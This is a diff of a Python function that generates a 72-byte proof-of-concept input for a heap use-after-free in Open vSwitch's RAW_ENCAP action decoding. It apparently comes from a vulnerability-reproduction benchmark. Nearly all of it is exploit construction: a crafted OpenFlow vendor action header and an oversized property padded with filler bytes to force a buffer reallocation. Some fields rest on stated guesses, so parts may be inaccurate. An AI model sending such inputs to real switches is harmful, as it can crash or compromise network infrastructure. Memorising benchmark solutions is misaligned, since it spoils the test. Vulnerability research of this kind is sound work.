@@ -1,57 +1,84 @@
 import struct
+import tarfile
+import re
+import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in OVS RAW_ENCAP decoding.
+        # Default values for OVS constants
+        raw_encap_subtype = 46
+        prop_class_l2 = 0
+
+        # Attempt to scan source code for correct constants
+        try:
+            with tarfile.open(src_path, 'r') as tar:
+                for member in tar.getmembers():
+                    if member.isfile() and (member.name.endswith('.h') or member.name.endswith('.c')):
+                        try:
+                            f = tar.extractfile(member)
+                            if f:
+                                content = f.read().decode('utf-8', errors='ignore')
+                                
+                                # Search for NXAST_RAW_ENCAP value
+                                # enum { ... NXAST_RAW_ENCAP = 46, ... }
+                                m = re.search(r'NXAST_RAW_ENCAP\s*=\s*(0x[0-9a-fA-F]+|\d+)', content)
+                                if m:
+                                    raw_encap_subtype = int(m.group(1), 0)
+                                    
+                                # Search for NX_ENCAP_PROP_CLASS_L2 value
+                                # Look for #define or enum assignment
+                                m = re.search(r'NX_ENCAP_PROP_CLASS_L2\s*=?\s*(0x[0-9a-fA-F]+|\d+)', content)
+                                if m:
+                                    prop_class_l2 = int(m.group(1), 0)
+                        except Exception:
+                            continue
+        except Exception:
+            pass
+
+        # Construct PoC
+        # Goal: Trigger buffer reallocation in decode_ed_prop -> heap-use-after-free of 'encap' pointer
+        # We need an NXAST_RAW_ENCAP action with enough property data to exceed initial buffer capacity.
+        # Given "Ground-truth PoC length: 72 bytes", we fill the action to this size.
         
-        The vulnerability occurs in decode_NXAST_RAW_ENCAP when decode_ed_prop triggers a reallocation
-        of the output ofpbuf, invalidating the 'encap' pointer which is subsequently dereferenced.
-        We construct an NXAST_RAW_ENCAP action with enough properties to exceed the initial buffer size (64 bytes).
+        # OpenFlow / OVS Constants
+        ofpat_vendor = 0xFFFF
+        nx_vendor_id = 0x00002320
         
-        Ground-truth PoC length: 72 bytes.
-        """
-        
-        # Constants for NXAST_RAW_ENCAP
-        OFPAT_VENDOR = 0xffff
-        NX_VENDOR_ID = 0x00002320
-        NXAST_RAW_ENCAP = 46  # Subtype for RAW_ENCAP (also known as ENCAP)
-        TOTAL_LEN = 72        # Matches ground-truth length
-        
-        # Build the Action Header (16 bytes)
-        # Format: Type(2), Length(2), Vendor(4), Subtype(2), Pad(6)
-        # struct nx_action_raw_encap {
-        #     ovs_be16 type;
-        #     ovs_be16 len;
-        #     ovs_be32 vendor;
-        #     ovs_be16 subtype;
-        #     uint8_t pad[6];
+        # Action Header (16 bytes)
+        # struct nx_action_encap {
+        #     ovs_be16 type;       /* OFPAT_VENDOR */
+        #     ovs_be16 len;        /* Total length (header + props) */
+        #     ovs_be32 vendor;     /* NX_VENDOR_ID */
+        #     ovs_be16 subtype;    /* NXAST_RAW_ENCAP */
+        #     ovs_be16 ver_flags;  /* 0 */
+        #     ovs_be32 new_pkt_type; /* 0 */
         # };
-        header = struct.pack('!HHIH6s', 
-                             OFPAT_VENDOR, 
-                             TOTAL_LEN, 
-                             NX_VENDOR_ID, 
-                             NXAST_RAW_ENCAP, 
-                             b'\x00' * 6)
         
-        # Build Properties (56 bytes)
-        # We need to fill the remaining 56 bytes with valid properties.
-        # 56 bytes / 8 bytes per property = 7 properties.
-        # This volume of data (approx 16 bytes header + 7*8 data) should exceed 
-        # the default 64-byte stack buffer for ofpacts, triggering realloc.
+        total_len = 72
+        header = struct.pack("!HHIHHI", 
+                             ofpat_vendor, 
+                             total_len, 
+                             nx_vendor_id, 
+                             raw_encap_subtype, 
+                             0, 
+                             0)
+
+        # Property (Remaining 56 bytes)
+        # struct ofp_ed_prop_header {
+        #     ovs_be16 prop_class;
+        #     ovs_be8 type;
+        #     ovs_be8 len;
+        # };
+        # Followed by data.
         
-        # Property: NXENCAP_PROP_ETHERTYPE (Type 1)
-        # Header encoding: (Type << 5) | Len_Units
-        # We use Len_Units = 1 (8 bytes)
-        # Header = (1 << 5) | 1 = 0x0021
-        prop_header = 0x0021
+        prop_len = total_len - len(header)  # 56 bytes
+        prop_type = 0  # Assuming type 0 is valid for the class
         
-        # Property Body: Ethertype (2 bytes) + Padding (4 bytes)
-        # Total property size: 2 (Header) + 2 (Ethertype) + 4 (Pad) = 8 bytes
-        ethertype = 0x0800
-        prop_body = struct.pack('!HH4s', prop_header, ethertype, b'\x00' * 4)
+        # We use a large property to fill buffer and trigger realloc
+        prop_hdr = struct.pack("!HBB", prop_class_l2, prop_type, prop_len)
         
-        # Construct full payload
-        payload = prop_body * 7
+        # Data payload
+        data_len = prop_len - len(prop_hdr)
+        data = b'\x41' * data_len
         
-        return header + payload
+        return header + prop_hdr + data
